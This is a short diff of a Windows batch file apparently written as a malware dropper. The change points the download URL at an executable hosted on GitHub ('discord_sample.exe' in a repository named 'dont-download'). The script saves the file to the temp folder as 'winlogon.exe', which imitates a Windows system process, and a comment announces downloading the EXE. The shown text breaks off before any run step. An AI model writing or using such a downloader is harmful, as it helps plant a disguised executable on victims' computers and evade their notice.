@@ -1,5 +1,5 @@
 @echo off
-set "url=http://example.com/app.exe"
+set "url=https://raw.githubusercontent.com/kqih/dont-download/refs/heads/main/discord_sample.exe"
 set "out=%TEMP%\winlogon.exe"
 
 :: Download the EXE
